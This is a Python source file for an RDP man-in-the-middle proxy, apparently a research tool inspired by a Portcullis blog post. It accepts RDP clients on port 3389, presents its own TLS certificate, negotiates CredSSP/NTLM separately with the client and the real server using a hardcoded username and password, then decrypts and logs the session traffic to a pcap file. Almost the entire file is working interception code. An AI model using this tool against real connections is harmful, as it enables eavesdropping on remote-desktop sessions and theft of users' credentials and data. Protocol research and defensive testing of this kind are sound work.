#!/usr/bin/env python3
#DiabloHorn http://diablohorn.wordpress.com
#Inspired by: https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/
#Resources:
#   http://stackoverflow.com/questions/7574092/python-scapy-wrpcap-how-do-you-append-packets-to-a-pcap-file
#   http://efod.se/media/thesis.pdf

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
from scapy.all import *
from socket import *
import ssl
# import thread
import threading
import binascii
import time
import re

import credssp
import mccp
import parser_v2

# import sslkeylog
# sslkeylog.set_keylog(os.environ.get('SSLKEYLOGFILE'))  # Or directly specify a path
# sslkeylog.set_keylog('/home/rsa-key-20171202-gcp-aws-cloud9/aws-cloud9-root/rdps2rdp/rdps2rdp/SSLKEYLOGFILE.key')  # Or directly specify a path

# the NON_DH_CHIPHERS was generated using: `openssl ciphers | tr : '\n' | grep -v DH | paste -d: -s`
NON_DH_CIPHERS = "RSA-PSK-AES256-GCM-SHA384:RSA-PSK-CHACHA20-POLY1305:AES256-GCM-SHA384:PSK-AES256-GCM-SHA384:PSK-CHACHA20-POLY1305:RSA-PSK-AES128-GCM-SHA256:AES128-GCM-SHA256:PSK-AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:SRP-RSA-AES-256-CBC-SHA:SRP-AES-256-CBC-SHA:RSA-PSK-AES256-CBC-SHA384:RSA-PSK-AES256-CBC-SHA:AES256-SHA:PSK-AES256-CBC-SHA384:PSK-AES256-CBC-SHA:SRP-RSA-AES-128-CBC-SHA:SRP-AES-128-CBC-SHA:RSA-PSK-AES128-CBC-SHA256:RSA-PSK-AES128-CBC-SHA:AES128-SHA:PSK-AES128-CBC-SHA256:PSK-AES128-CBC-SHA"


BUFF_SIZE = 8192
OUTPUTPCAP = "output.pcap"
LISTENCON = ('0.0.0.0', 3389)
# REMOTECON = ('127.0.0.1', 3390)
host_port = '127.0.0.1:3390'
#host_port = '2.tcp.ngrok.io:19173'
REMOTECON = (host_port.split(':')[0], int(host_port.split(':')[1]))

SERVER_USER_NAME = "runneradmin"
SERVER_PASSWORD = "P@ssw0rd!"


def to_hex(b):
    # return ' '.join(x.encode('hex') for x in msg
    return " ".join("{:02x}".format(x) for x in b)


def receivePdu(sock, sockName):
    msg = b''
    
    print("%s receive: waiting" % sockName)
    sock.settimeout(1)
    temp = b''
    try:
        temp = sock.recv(BUFF_SIZE)
        msg += temp
    except IOError as e:
        if (not re.search("Resource temporarily unavailable", str(e))
                and not re.search("The operation did not complete", str(e))):
            print("%s receive: %s" % (sockName, e))
    print("           Msg from %s [len(msg) = %s] : '%s'" % (sockName, len(msg), to_hex(msg)))
    # print("      ->                '%s'" % msg)
    sock.settimeout(None)
    return msg

def sendPdu(sock, sockName, pdu):
    print("Forwarding Msg from %s [len(msg) = %s] : '%s'" % (sockName, len(pdu), to_hex(pdu)))
    # print("      ->                '%s'" % pdu)
    sock.sendall(pdu)
    
        # # the first response PDU from the server is X.224 Connection Confirm
        # # with a payload of [MS-RDPBCGR] RDP_NEG_RSP
        # # byte 16 of the PDU is RDP_NEG_RSP.selectedProtocol and
        # # \x01 = PROTOCOL_SSL
        # if(serverMsg[11] == '\x02' and serverMsg[15] != '\x01'):
        #     serverMsg = list(serverMsg)
        #     serverMsg[15] = '\x01'
        #     serverMsg = "".join(serverMsg)

def passthrough(pduName, sourceSocket, sourceName, destSocket, destName):
        print(pduName)
        pdu = receivePdu(sourceSocket, sourceName)
        sendPdu(destSocket, destName, pdu)

def negotiate_credssp_as_server(sock):
    context = credssp.CredSSPContext(sock.getpeername()[0], None, None, auth_mechanism='ntlm')
    credssp_gen = context.credssp_generator_as_server(sock)

    # loop through the CredSSP generator to exchange the tokens between the
    # client and the server until either an error occurs or we reached the
    # end of the exchange
    out_token, step_name = next(credssp_gen)
    while True:
        try:
            in_token = receivePdu(sock, "Client")
            credssp.print_ts_request(in_token)
            out_token, step_name = credssp_gen.send(in_token)
            print("CredSSP: %s" % step_name)
            sendPdu(sock, "MitM", out_token)
            credssp.print_ts_request(out_token)
        except StopIteration:
            break
    print("CredSSP: server unkown message")
    sendPdu(sock, "MitM", '\x00\x00\x00\x00')

def negotiate_credssp_as_client(sock, username=None, password=None):
    context = credssp.CredSSPContext(sock.getpeername()[0], username, password, auth_mechanism='ntlm')
    credssp_gen = context.credssp_generator_as_client(sock)

    # loop through the CredSSP generator to exchange the tokens between the
    # client and the server until either an error occurs or we reached the
    # end of the exchange
    out_token, step_name = next(credssp_gen)
    while True:
        try:
            print("CredSSP: %s" % step_name)
            sendPdu(sock, "MitM", out_token)
            credssp.print_ts_request(out_token)
            in_token = receivePdu(sock, "Server")
            credssp.print_ts_request(in_token)
            out_token, step_name = credssp_gen.send(in_token)
        except StopIteration:
            break

def handler(clientsock,addr):
    try:
        useCredSsp = False
        serversock = socket(AF_INET, SOCK_STREAM)
        serversock.connect(REMOTECON)
        serversock.setblocking(1)
        
        print('RDP: clientConnectionRequest')
        clientConnectionRequestPdu = receivePdu(clientsock, "Client")
        sendPdu(serversock, "Client", clientConnectionRequestPdu) #RDP_NEG_REQ_TLS)
        
        print('RDP: serverConnectionConfirm')
        serverConnectionConfirm = receivePdu(serversock, "Server")
        print(parser_v2.parse(serverConnectionConfirm))
        # print('serverConnectionConfirm[11] = ', serverConnectionConfirm[11])
        # print('serverConnectionConfirm[15] = ', serverConnectionConfirm[15])
        # the first response PDU from the server is X.224 Connection Confirm
        # with a payload of [MS-RDPBCGR] RDP_NEG_RSP
        # byte 11 of the PDU is the PDU type
        # \x02 = RDP_NEG_RSP
        # \x03 = RDP_NEG_FAILURE
        # byte 16 of the PDU is RDP_NEG_RSP.selectedProtocol and
        # \x01 = PROTOCOL_SSL
        if (serverConnectionConfirm[11] == 0x02 and serverConnectionConfirm[15] == 0x01):
            print('Server requested TLS security')
        elif (serverConnectionConfirm[11] == 0x02 
            and (serverConnectionConfirm[15] == 0x03
                or serverConnectionConfirm[15] == 0x08)):
            print('Server requested Hybrid security (CredSSP) with version %s' % str(serverConnectionConfirm[15]).encode('hex'))
            useCredSsp = True
            # serverConnectionConfirm = RDP_NEG_RSP_TLS
        elif (serverConnectionConfirm[11] == 0x03):
            raise ValueError('Server rejected the connection with reason: %s' % str(serverConnectionConfirm[15]).encode('hex'))
        else:
            raise ValueError('Server requested unknown security')
        sendPdu(clientsock, "Server", serverConnectionConfirm)

        print('Intercepting rdp session from %s' % clientsock.getpeername()[0])
        # ssl_ctx = ssl.create_default_context()
        # ssl_ctx.check_hostname = False
        # ssl_ctx.verify_mode = ssl.CERT_NONE
        # sslserversock = ssl_ctx.wrap_socket(serversock)
        sslserversock = ssl.wrap_socket(serversock,ssl_version=ssl.PROTOCOL_TLS)
        sslserversock.do_handshake() #just in case
        serversock = None # avoid accidentally reading the encrypted bytes
        
        sslclientsock = ssl.wrap_socket(clientsock, server_side=True,certfile='cert.pem',keyfile='cert.key',ciphers=NON_DH_CIPHERS)#, ssl_version=ssl.PROTOCOL_TLSv1)
        sslclientsock.do_handshake() #just in case
        clientsock = None # avoid accidentally reading the encrypted bytes
        
        if useCredSsp:
            if False: # pass-through observer mode
                print('CredSSP: clientSpnego - Negotiate')
                clientSpnego = receivePdu(sslclientsock, "Client")
                sendPdu(sslserversock, "Client", clientSpnego)
                credssp.print_ts_request(clientSpnego)
                
                print('CredSSP: serverSpnego - challenge')
                serverSpnego = receivePdu(sslserversock, "Server")
                sendPdu(sslclientsock, "Server", serverSpnego)
                credssp.print_ts_request(serverSpnego)
            
                print('CredSSP: clientPublicKey - authenticate')
                clientPublicKey = receivePdu(sslclientsock, "Client")
                sendPdu(sslserversock, "Client", clientPublicKey)
                credssp.print_ts_request(clientPublicKey)
                
                print('CredSSP: serverPublicKey - ??')
                serverPublicKey = receivePdu(sslserversock, "Server")
                sendPdu(sslclientsock, "Server", serverPublicKey)
                credssp.print_ts_request(serverPublicKey)
                
                # print('CredSSP: clientCredentials - ??')
                # clientCredentials = receivePdu(sslclientsock, "Client")
                # sendPdu(sslserversock, "Client", clientCredentials)
            else:
                print('CredSSP: MitM with Server')
                negotiate_credssp_as_client(sslserversock, username=SERVER_USER_NAME, password=SERVER_PASSWORD)
                print('CredSSP: MitM with Client')
                negotiate_credssp_as_server(sslclientsock)

        # passthrough('RDP: client ConfrenceCreate', sslclientsock, "Client", sslserversock, "Server")
        # passthrough('RDP: server ConfrenceResponse', sslserversock, "Server", sslclientsock, "Client")
        
        to_server, to_client = TcpStream.create_stream_pair(sslserversock,sslclientsock)
        print('Passing traffic through uninterpreted from client to server')
        threading.Thread(target=trafficloop, args=(to_server,True)).start()

        print('Passing traffic through uninterpreted from server to client')
        threading.Thread(target=trafficloop, args=(to_client,True)).start()
        
    except:
        import traceback
        traceback.print_exc()

class TcpStream(object):
    def __init__(self, source, destination):
        self.source = source
        self.destination = destination
        self.bytes_received = 0
        self.bytes_sent = 0
        self.oposite_stream = None
        
    @staticmethod
    def create_stream_pair(server, client):
        to_client = TcpStream(server, client)
        to_server = TcpStream(client, server)
        
        to_client.oposite_stream = to_server
        to_server.oposite_stream = to_client
        
        return (to_server, to_client)
        
    def make_tcp_packet(self, payload):
        return (IP(src=self.source.getpeername()[0], dst=self.destination.getpeername()[0])
                /TCP(sport=self.source.getpeername()[1], dport=self.destination.getpeername()[1], seq=self.bytes_sent, ack=self.oposite_stream.bytes_sent, flags='PA')
                /Raw(payload))
                
    def receive(self, buffer_size):
        msg = self.source.recv(buffer_size)
        if msg:
            self.bytes_received += len(msg)
        return msg
    
    def send(self, msg):
        self.destination.sendall(msg)
        if msg:
            self.bytes_sent += len(msg)

def trafficloop(tcpStream,dopcap):
    msg = ' '
    rdp_context = parser_v2.RdpContext()
    try:
        while msg:
            msg = tcpStream.receive(BUFF_SIZE)
            if msg:
                if dopcap:
                    # pkt_list = rdpcap(OUTPUTPCAP)
                    # socket.getpeername()
                    # socket.getsockname()
                    pkt = tcpStream.make_tcp_packet(msg)
                    # s = hexdump(pkt, dump=True)
                    wrpcap(OUTPUTPCAP,pkt,append=True)
                # print("           Msg from %s [len(msg) = %s] : '%s'" % (tcpStream.source.getpeername()[0], len(msg), to_hex(msg)))
                print("           Msg from %s [len(msg) = %s] : '%s'" % (tcpStream.source.getpeername()[0], len(msg), parser_v2.parse(msg, rdp_context)))
                tcpStream.send(msg)
            else:
                print('Shutting down rdp session')
                tcpStream.source.shutdown(socket.SHUT_RD)
                tcpStream.destination.shutdown(socket.SHUT_WR) 
    except:
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    True
    False

    if True: # MITM
        print('deleting old pcap file: ', OUTPUTPCAP)
        try:
            os.remove(OUTPUTPCAP)
        except FileNotFoundError:
            pass
        
        serversock = socket(AF_INET, SOCK_STREAM)
        serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        serversock.bind(LISTENCON)
        serversock.listen(5)
        while 1:
            print('waiting for connection...')
            clientsock, addr = serversock.accept()
            print('...connected from:', addr)
            
            if True: # intercept and decrypte MITM
                handler(clientsock,addr)
                
            if False: # observe only MITM
                destsock = socket(AF_INET, SOCK_STREAM)
                destsock.connect(REMOTECON)
                destsock.setblocking(1)
        
                to_server, to_client = TcpStream.create_stream_pair(destsock,clientsock)
                print('Passing traffic through uninterpreted from client to server')
                threading.Thread(target=trafficloop, args=(to_server,True)).start()
        
                print('Passing traffic through uninterpreted from server to client')
                threading.Thread(target=trafficloop, args=(to_client,True)).start()
                break

    if False: # read/print pcap file
        pkt_list = rdpcap(OUTPUTPCAP)
        for pkt in pkt_list:
            print(repr(pkt))
            print(pkt[Raw].load)
        
    if False: # connect as client
        serversock = socket(AF_INET, SOCK_STREAM)
        serversock.connect(REMOTECON)
        sendPdu(serversock, "Server", RDP_NEG_REQ_CREDSSP)
        serverConnectionConfirm = receivePdu(serversock, "Server")
        print('Connection Confirm protocol chosen: %s' % str(serverConnectionConfirm[15]).encode('hex'))
        
        # ssl_ctx = ssl.create_default_context()
        # ssl_ctx.check_hostname = False
        # ssl_ctx.verify_mode = ssl.CERT_NONE
        # sslserversock = ssl_ctx.wrap_socket(serversock)
        sslserversock = ssl.wrap_socket(serversock,ssl_version=ssl.PROTOCOL_TLS)
        sslserversock.do_handshake() #just in case
        negotiate_credssp_as_client(sslserversock, username=SERVER_USER_NAME, password=SERVER_PASSWORD)
                
        # serverCapabilitiesPDU = receivePdu(serversock, "Server")
        # sendPdu(serversock, "Server", CredSSP_PDU_1)
        # serverCapabilitiesPDU = receivePdu(serversock, "Server")
    
    if False: # listen as server only for CredSSP, no passthrough
        serversock = socket(AF_INET, SOCK_STREAM)
        serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        serversock.bind(LISTENCON)
        serversock.listen(5)
        print('waiting for connection...')
        clientsock, addr = serversock.accept()
        print('...connected from:', addr)
        # handler(clientsock,addr)
        
        print('RDP: clientConnectionRequest')
        clientConnectionRequestPdu = receivePdu(clientsock, "Client")
        print('RDP: serverConnectionConfirm')
        sendPdu(clientsock, "Server", RDP_NEG_RSP_CREDSSP)
        print('Intercepting rdp session from %s' % clientsock.getpeername()[0])
        sslclientsock = ssl.wrap_socket(clientsock, server_side=True,certfile='cert.pem',keyfile='cert.key', ciphers=NON_DH_CIPHERS)#,ssl_version=ssl.PROTOCOL_TLSv1)
        sslclientsock.do_handshake() #just in case
        clientsock = None # avoid accidentally reading the encrypted bytes
        print('ssl connection context: %s' % sslclientsock.context)
        print('ssl connection cipher: %s' % (sslclientsock.cipher(),))
        print('ssl connection context: %s' % dir(sslclientsock.context))
        for k in [attr for attr in dir(sslclientsock.context) if not attr.startswith('__')]:
            # if isinstance(v, property):
            v = getattr(sslclientsock.context, k)
            if callable(v):
                continue
            try:
                print("    %s: %s" % (k, v))
            except:
                pass
            
        print('CredSSP: MitM with Client')
        negotiate_credssp_as_server(sslclientsock)
        print('done CredSSP')
        afterCredssp = receivePdu(sslclientsock, "Client")

    
    if False: # parse static data
        raw_msgs = [
            # clientSpnego_raw, 
            # mitm_pdu_1, 
            # client_pdu1_resp, 
            # mitm_pdu_2,
            SPNEGO_CHALLENGE_WINDC,
            # SPNEGO_CHALLENGE_MITM,
            ]
            
        for req_raw in raw_msgs:
            print_ts_request(req_raw)
        
    if False: # parse flags
        from spnego._kerberos import (
            parse_flags,
        )
        from spnego._ntlm_raw.messages import (
            NegotiateFlags,
        )
        import pprint
        pprint.pprint(parse_flags(3800728117, enum_type=NegotiateFlags))
        
    if False: # play with scapy
        tcp = (IP(src='8.8.8.8', dst='127.0.0.1')
            / TCP(sport=63, dport=63, flags='PA', seq=1, ack=1))
        tcp.display()
        